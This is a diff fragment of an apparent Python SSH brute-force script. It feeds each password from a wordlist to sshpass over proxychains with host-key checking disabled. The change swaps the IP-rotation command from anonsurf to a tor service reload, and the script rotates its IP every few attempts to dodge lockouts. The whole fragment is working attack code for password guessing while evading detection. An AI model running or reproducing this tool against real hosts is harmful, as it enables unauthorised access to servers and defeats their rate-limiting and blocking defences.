@@ -124,7 +124,7 @@ def main():
 			for line in f:
 				if(c == attempts):
 					c = 0
-					os.system('echo "Italy" | anonsurf change')
+					os.system('service tor reload')
 					print '[*] Ip changed !'
 				print 'We\' re trying with: ' + line
 				var = 'proxychains sshpass -p ' + line[:-1] + ' ssh -o StrictHostKeyChecking=no ' + user + '@' + ip + ' -p ' + port
